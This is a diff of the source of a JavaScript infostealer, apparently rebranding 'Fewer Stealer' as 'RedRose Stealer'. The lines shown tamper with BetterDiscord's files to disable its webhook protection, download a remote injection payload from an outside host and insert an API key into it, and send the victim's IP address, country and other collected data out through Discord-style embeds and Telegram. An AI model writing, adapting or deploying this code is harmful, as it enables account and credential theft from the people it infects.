@@ -1576,7 +1576,7 @@ async function InfectDiscords() {
     var injection, betterdiscord = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
     if (fs.existsSync(betterdiscord)) {
         var read = fs.readFileSync(dir);
-        fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "fewer"))
+        fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "RedRose"))
     }
     await httpx(`https://redroseproject.xyz/h4IjWLBQGR6lcqpE`).then((code => code.data)).then((res => {
         res = res.replace("%API_AUTH_HERE%", api_auth), injection = res
@@ -1917,10 +1917,10 @@ async function getIPAddress() {
       description: `<a:blackworld:1095741984385290310> Current IP Address: ${ip_address}\n <a:blackworld:1095741984385290310>Country: ${country}`,
       color: 2895667,
       author: {
-        name: 'Fewer Stealer'
+        name: 'RedRose Stealer'
       },
       footer: {
-        text: 'Powered by Fewer Stealer',
+        text: 'Powered by RedRose Stealer',
       },
       timestamp: new Date()
     };
@@ -2104,7 +2104,7 @@ async function SubmitTelegram() {
                 { name: '🔗 Download Page', value: responseData.downloadPage || 'N/A', inline: true },
                 { name: '📄 File Name', value: responseData.fileName || 'N/A', inline: true }
             ],
-            footer: { text: 'Fewer Stealer' }
+            footer: { text: 'RedRose Stealer' }
         };
 
         const randomString = crypto.randomBytes(3).toString('hex');
